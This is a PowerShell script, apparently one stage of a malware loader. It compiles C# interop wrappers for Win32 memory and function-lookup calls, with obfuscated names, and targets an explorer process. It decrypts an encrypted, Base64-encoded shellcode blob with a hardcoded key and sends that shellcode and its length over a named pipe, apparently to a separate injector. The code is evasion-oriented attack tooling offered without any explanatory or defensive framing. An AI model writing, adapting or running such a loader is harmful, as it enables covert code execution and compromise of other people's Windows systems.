#Pipe1
$Win32 = @"
using System;
using System.Runtime.InteropServices;


public static class Main
    {

    public static Delegate GetDele(IntPtr ptr){
        return Marshal.GetDelegateForFunctionPointer(ptr, typeof(CRTStub));
    }

    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string nFunction);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr CRTStub(IntPtr h, IntPtr a, IntPtr b, IntPtr c, IntPtr d, UInt32 e,UInt32 p,  out IntPtr f);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]    public delegate IntPtr VAStub(IntPtr a, UIntPtr b, UInt32 c, UInt32 d);

    public static Delegate thQFLBYd(IntPtr ptr){
            return Marshal.GetDelegateForFunctionPointer(ptr, typeof(VAStub));
    }

    [DllImport("msvcrt.dll")]
    public static extern IntPtr malloc(uint src);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary( [MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr b,UIntPtr s,uint p,out uint o);

    public static IntPtr PZJvAMbs(IntPtr hModule, string nFunction){
        return GetProcAddress(hModule, nFunction.Replace("_",""));
    }

}
"@

Add-Type -TypeDefinition $Win32
$startMain = [Main]

$PIT = ((Get-Process -Name "*explorer*" | Select-Object -Index 1).Id)
$enc = "76492d1116743f0423413b16050a5345MgB8AFUAVwB3AEIAcABuAFkAWQBsAGUAOABWAEIANgBCAFcAegBFAHcAWQB6AEEAPQA9AHwAMQAyADcAYgBmAGEAYwAxADMAOQA4ADYAMgA5ADYAZABhAGMANQBmADAAMgBkADgAYgBhADUAMwA1AGYAZgA3AGMAMABmADMAOQA1AGIANQBhADEAMAA0ADgAZgAyADYAYgA2ADAAMgBiADQAOAAzAGEAMABmAGIAZAA2ADgANABlADUANQBjAGMANwA2AGYAMgA1ADUAZQA0ADcAZQA4ADcAYwA4AGMAZAA5AGEAZAAxAGYAZAA1AGMANwA1ADAAZQAyADgAYgA3ADgAYQBiAGEANwA0ADQAOAAyADAAMgA1ADkAMwBmADAAYgAxADAAMQA5ADcAZQA0ADcAMQAxAGQAZQAyAGIAZgA4AGQANgBkADEAMQA2ADUANgAyADAAMAA5ADUANgA0AGQAZABmADEAMQAwADYAMQAxADEAMwBiAGEAOABjADEAMgA3AGIAZABhADQANQBmADEAYwBjADIAOQA4AGIANQBkADYAYgA1ADgANwAwADkAZgA1ADEANABkADYANQA3ADMANAAzAGEAOQBiADYAMQA2ADMANgBjADIAYgAxADQANQA0AGIAOQBjADMAZgA2AGMAMwBjADkAYwBiAGUAMgBhADEAOABhADEANwAwADAAZAA5ADUAZgBjAGQAMwAzAGIAOAAxAGUAZQA4ADgAYQAxAGQAMAA0AGIAMQAzAGMAYgA2AGEAMgA3AGMAOAAwADEANwA4ADgAZQA0ADgAYQAyADAAYQBjAGQAYwA2ADIANQA1ADkAYQBmADgAMQBlADUAYQBhADcAYgAzAGQAYgA0AGYAOQA5AGMANAAwADgAZgBjAGEAZAAzAGIAOQAyADEAMwBiADEANABhADcAYwA4AGMAOQAwAGIAOAA5ADYAYwAzADAAYwAyADAAYwAwADMANwA0ADQAOABiAGYAOAA0ADkANQA4AGMAYwBhAGEAMQA5AGUAYQAwADcAYwBkADQANwBkADMAZgBlAGMAZABmAGQAMwBhAGYAZABmAGMAYwA4ADcAMwBiADcANgBiADIAZgA1ADQAMQA5ADcANwA0AGIAZAA1AGYAMwBjAGQAMgA4ADcAYgAyADIANQBiAGYAYwA4AGEAMQBmADUAZgBhADUANABlADYAZgAwADQANgBhAGQANQA3ADMAYwBlADUAYgAxADAANAA4ADkAMQAyADcAMABiADMAMQBjAGUANAA1ADcAYgA2ADUAYQA2ADkAYwA5AGQAYgA3AGUANgBhADUAOABlAGQAMABkADUAZQAyADEAOQA3AGUAZQBiADIAMQA1AGYANQA1ADcAZQAzADMAOQBhADQAYQBhADkAZAA3AGMAMgAxAGQAYwBjAGQAMQBjADIAMwAzAGQAZQA5AGMAYwBhADUAZQA0ADcAZQA5ADAAMQAzADgAYwAyAGYAZAA5ADgANwA5AGIAMQBlADEAOABkADEAMgAxAGQAMQBlADYAMwBkADQANQBiADUAYwBkADMAOAAxADEAMAA4ADgAMAA1ADYAZgA5AGYAYQBkAGMAZAAwADEAMQA4ADIAZQA4ADYAOABhAGIANAAwADQAZQA4ADMAOAAzADkAZgA1ADkAMwBjAGQAOQAxAGYAYwBjADcANQBlADIANQA4ADQAMgBkADIAZgBjAGIAOABiADQANgA3ADAAZgBjAGUAOABhADgANgA2ADIANwA4AGQAZQAxADcAZQBjADkAMwAwADUAMQA4ADcAYQA2ADkAMQBiAGEAMgBhADYAZgAwAGYAMgAxAGYAMQBkADQAOAA4ADQAYgBlAGUANABkADcAYgBiADYAYQBiADEANAAyAGEANQBlAGMAMwBlAGMAOABlAGUAMwAxAGQAOQBiAGUAOQBhAGYAYgBlADYAMgBlAGMAOABlADcANgBkAGMAOABiADYAMAAxAGMAYQAzADcAMQBjADcAMABiAGMAOQBjADYAMQAxAGMAMQA3ADcAYwAwADAANwBmADAAYQAzAGQAMAAzADkAZgA5ADgANwAwADQAOAA4ADAAYwA3ADUAOAAyAGIAYwAyAGIAMgA2AGUANgBhAGUAOAA3ADEAMgA3AGYANQBjADYANABjADIAYgBhADEAZQA0ADIAMwA5AGIAMABiADEAYwAzADQANwA5AGIAMQBmAGEAYgA2AGQANABhADIAMAA2ADcAMwBkADMANQBhADMAZQA5ADEANwBjADcAZgBiADQAMwA3ADUANAA4ADcAMwAyAGUAOAAwAGQAMQA0AGUANwBhADYAYwBlAGUANABkADQAMwA3ADAAZgA2ADYAZQAzADQAZQA5ADEAZAA1ADAANQAzADAAMwBlADYANwA3ADIAYgAwADkAOABkADIAMAAzAGUAYgAwAGMAMwA3ADEAMwBjADcAYwA2ADUANwA2AGIANgA5ADAAMwBmAGEANgBmAGYANwBjADgANwBmAGQAMwAwADMAYQBiAGYAMAA1ADYAOABmADYAZgBkAGIAYgBlADkAYQBhAGQAMwA3AGUAOAA5ADIAYwA0ADMAMQA2ADUAMQAxADIANwA5AGIANwAyADgAMQAxAGIAOABhADcAYwAxADAAYwA5AGEANgA5ADUAMAA1ADAANwA3AGQAYQA4ADcAZgA0ADUANgAxADIAMAA0ADMAMABlADMAZABlADAAMwA2AGIAZAAzAGEANQA0AGYANABiADAAMwBlADgAZgA5AGEANAAwAGMAYgBmADQAYgBhAGUAYwBiADcAYgA3AGUANQAyADUAMgBkADEAOQBlADEANgAyADgANwAzADUAOAAwADkAYwA0ADcAYQAzADEAYQBjADgAZABkAGYANgAzADQAOQA5AGEAYQBjAGUANQAwAGQANwBjAGYAOQAxADYANAA2AGIAOQA3AGMANgA1ADEAYgA4ADMAOQAzADQAMABkAGQAZAAyADAAYQAwADcAMwAxAGUAYwAwADgAYgAxADgAYwA0AGUANQA0AGYAYwA2ADMAYgA5ADkAZQBmADcANQA1ADcANAAzAGUANQBlADkAMgA2AGQAMwA0AGMAYwA2ADMAMgA4ADEAMQAzAGUAOABiADkANgA0ADYAYgA4ADAAMABiADIAYQBlAGUAMAA1ADAAZAA4ADYAMwBhADcAZAAzAGMAMgAxADcAMQAyADYAZQA2AGYAMAA0AGEAOAA3ADgAZQA3AGIANwBkADcANQAxADQAYgBiAGYAMAA2ADUAOAA2ADIAYQA5AGIANgBlADYAZQBmADUAMQBmADcAYQA4AGMAMQAwAGMAMAAzADAAMABkADYAZQAyAGUAMQBhADIAOAAyAGQAOABhADYAYQAzADQAMABlADYAOAA5ADcAMgBjADAAZABjADEAMwA4ADEAYwAzADUAYwBmADYAOAA1ADEANgBkADQANAA3ADIAMwAwADIAOABlADkANgBiAGMAZQBhADcAZQAxADAANwBhADgAYgAyADQAYwAwAGMAOABlADYAMQA4AGQAMgA5AGIANQA3AGQAMQAwADgAYQA0ADIANAA5ADQAMgBjADQAMwAzADQAYwA1AGQAYwA0ADgAYQA3ADUAZQBjAGUAOQBkADMANgAyADQANABhADgAMgBiADUAMgBmAGUAMgBiAGEAYQA2AGYAOQA1AGEAMQA5AGYAOQAyADQAZgAxAGUAYgBjADcAYQAzAGIAYwA5ADgANwBiADcANwA0AGUAMQAyADIANwBmADAAZgBhAGEAZQA4ADcAYwBmADgAMQA4AGMAYgAwAGUAYwA5AGQANQA2ADgAYQBiAGYAMABlADIANwBiADgAMgBkADkANwA3AGUAYwAyADEAYwAwADcANABmADkAMABiADUANwAxAGQANABhADgAOAA0ADMAMAAyAGYANgA0ADEAZQAxAGEAZAAxAGMANAA5ADgAOAA2ADEAOQBlADUAMgA3ADkAMQBjADgANQBmADcAMQA1ADEAYgBiADUAMQA5ADEAYgAxAGIAOQAwAGYAZgBlADIAZABmAGMAYgBkADcAZQBhADIANQA3ADAAZgAzAGUAYwAwADAAYwBiADAAYwA5ADAANgBkAGMAMQAwADgAYQBmAGYAMQAxADkANAA1ADcANgA5ADgAYgA0ADIAYwBmAGEAZAA4ADUAZAAyADYAMgA3ADMANwBmADgAZgA3AGEAYQBiAGUANgAzAGQANQA4ADIANwBlADEAOABiADMAOAAwAGUAMwAxAGQANgBjAGMAOAAyAGMAYwBiADIAOQBhAGIAZQBhADAAMwA5ADcAOQBhAGEAOABhADYAYwAyADQAMgAyADkANQBhADAAYgBlAGMAZQAyADEAZABkADYAOAAwADAAMQA2ADQAMQBlADEANQA0ADgAMgAxADgANQBlADYAOAAxADUAZgAxADQAMwA4ADAAOQBhAGMAZQBiAGQAOQBlADgAOAAyADgANQA4AGYAOAA2ADUAZgBlAGYAMABkAGEAZQBhAGQAZQBhADkANAA3ADgANgAzAGQANwAyADQANAA5ADcANABhADYAZgA3ADgAZgBmAGMAYwAwADAAYgAwAGQANgBhAGMAOQA1AGMANwA1ADQAZABlADkAOAAxADcANQA0AGIANQA0ADQAOQBmADQAYwA2ADAAZAA1ADYANwAyADMAMwA2ADgAZQBkAGUANQA1ADEAOQA2AGYAZgAzADgAZQAzADkAMQAwADMANgA0ADkANQA3AGUANgBlAGQAYQAzADAAZAA3ADYAMAAxADMAYwA2AGMAMAAzADcAYwBlAGMAOQAwADQAYwBjADMAZgAyADgAZQAyAGUAZgA2ADQAOABhADYAMQA3AGMAMgA4AGUAMAA2AGIAMQBkADAAMQBjADUAMgAyADAAMwAyADEAMwAxAGEAMQAyAGUANQAwADMAOQA0ADcAOQBhADcANgBhADcAMABlADAAMgA2AGYAZAAxADMAMwA0AGQANgA5ADUAYQBkAGQAZQAyADgAYgA5ADcANAA5ADcANQA2ADYAMwBhAGQAMwBkADcAYwA1ADYAZgAzAGIANwA5ADcAOABlADYAOAAzADEAZABmADQANQBjADQAYQBmADIANwAwAGEAMwAzADkAYgBiADgAOAAzAGQAYgBkAGYAMgA1ADQAYQBmADMAMgA3AGMAMAA3ADIAOAA2AGUAZQBmADAANABkAGUAYQA1ADkANwA3AGQAZAAyAGMANAA4AGEAZQA3ADMAYgA0ADMAMwA5ADEAYQBhADQAMABjADEANwA0ADcAZgBlAGUAYwA3ADMAYQBkAGMANgBjAGQAYQA5AGQAOAA5AGIAYwBiADMAMgAyAGYAZAAxADYAMABhADYAZQA3ADcANgAwADIAMgBkAGEAOABkADcAZgBjAGQAZABhAGYAYgA1ADkANQA1ADAAOABiAGUAYQBlADEAZQBmADYAZQBiADAAMABhADMANgBiAGIANQBjAGMAOQA3AGYAZAA0AGIAZgBkAGUANgA1AGEAYQA5ADIANAAzADUAMAA2ADYANgAyADAAYwAzAGIAOAA5ADAAZAA1ADYANwA0ADUANwA5ADYANABjADAAZQA4ADQAYwA4ADEAOABkAGQAZABiAGEAOABmADMANwBhADUAMwAzADkANQBiADkAMAA3ADgAMAAyAGEANQAwADEAMQBiADMAOQA0ADIANgA2ADAAZQBkADkAMwA1AGYAZAA1ADQAYwA4ADMAYwA2ADgAYQAzAGIAYgA5AGYAOABkAGIANgAyADIAYgA1AGEAMQA1ADMAMAA4ADQAYQAyADIANwBkAGIAMwBkADIANgAxADYAOQA2ADYANQBhADcAZgBjADUAMwAyADMANwBhADQAZQAzADUAMwA0ADUANwA4ADEAZgA5ADgAMwA3AGYAZQA3ADkANQAxADgAMgBkADYAMABiAGQAMAAwADUAYQBmADAAYwAwAGMAYQAxADQAYQA4AGUAMQBlADUAZQA1ADUAMgBkAGUAMQBiADMAOQA3AGUAMAAzADEANwBkADYAZABlAGQAZgA1ADUAMgA0AGYAZABmADIAMABmADIANABlADkAMAA1ADkAZQBjAGMAOABkADYAOQAxADEAMQBiAGQAZABjADIAZAA2AGYANAAwAGQAYwBhAGYAYwAyADUAZgAxADEANQA0ADAAZgA0ADkANwA3AGUAMABmADMANAA2AGUAOAA1ADMAZABhADMAZgAwAGQAZAA1ADkAMQBlADkAZABjAGUAOAAyADkAMgA2ADMANwAzADgAOAA3AGQANAA2ADEAYwA4ADQAMwA0ADYAMAA0ADUAYwA0ADcANgBjADYAMwA0ADYAYgA1ADIAZgA4AGIAOQBiADcAZgAyADcAZQAwADcAMwA2ADgAYQBkADIAOABhADMAZAA4AGMANwBhAGQAMwAzADIAZQBjADAAOAAzADEANABkADgAMgAyADUAMQAzADAAOABmAGMAYQBkADkAMABhAGEANwA3ADEAMwAwAGIANQA3ADMAZQA5ADQAMQBkADUAZAA5AGUAZQA4ADgAOAA1ADIAMQBhADAAOABkAGQAMwA1ADcAMgAxAGYANAA1ADkAZABmADEAYQBiADcAYwBiAGEAOQBhADQANwAxADEANgAyAGMAMgAzADAAOQBkADkANgA4AGMANABkADkAYgA5AGUAMAA3ADIAYgA0AGQAYwA1AGQAOQAzADIAYQA1AGEAZQBlADUAMAA5AGMAYwA5ADUAYgBkAGYANQA3ADIAYwA4ADcAOABjADEANQAzADUAYgA3ADAAZgAzAGEAMQBhADgAMAAyADcAYgBhAGYAYwAwAGYANAAzADcANwBkADcAZAA5AGYANgA4ADkAMwAxADMAZgBhADcANgBiAGUAZQBjAGEANgBhADEAOQBkAGQAYQA2AGEANQAyADEAYgA1AGUAYQBmADEAZgBiADYAMwA2ADkAMAAwAGQAYwAyADYAOQA0ADYANwA3ADEAMQA0AGYAYgBlAGYANgA2ADgAMAAyADUAYwAxAGIANAA1AGIAOAAzADEAOABiADQAYwA0AGYANwAzADAAOQBmADQAYgAxADAAYwAxAGUAMAA1AGYANAA1ADgAMAAwADUAMwBmAGUAMQA2AGQAMABmADYAYwBjAGEAYgBmADAAOAAwADcAMwAwADMAOABkADEANABmAGQAMQBjAGUAYQA5ADgAZAA3AGUAYQA1ADUANAA4ADkAZgBjADMAZgBiADcANgA4AGIAMwA0ADMANQAzADIAMwBiADkAZQBkADcAOABlADcANwA5AGQAYQAyAGMAMgAzADcAOQA="
[byte[]] $k = 47,176,172,112,95,97,158,25,215,139,120,73,98,118,1,202,30,246,120,2,90,11,206,18,7,157,58,182,34,81,139,184
$sec = ConvertTo-SecureString $enc -Key $k
$p = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec))
[Byte[]]$shellcode =[System.Convert]::FromBase64String($p)
$SHLEN4 = $PIT * 4 + $shellcode.Length




#PIPING

$pipeName = "Pipe1"
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
#$pipe.WaitForConnection()
$pipe.Connect()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($SHLEN4)
$pipe.Write($bytes, 0, $bytes.Length)
$pipe.Close()

$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
#$pipe.WaitForConnection()
$pipe.Connect()
$enc = [System.Convert]::ToBase64String($shellcode)
$bytes = [System.Text.Encoding]::UTF8.GetBytes($enc)
$pipe.Write($bytes, 0, $bytes.Length)
$pipe.Close()

  




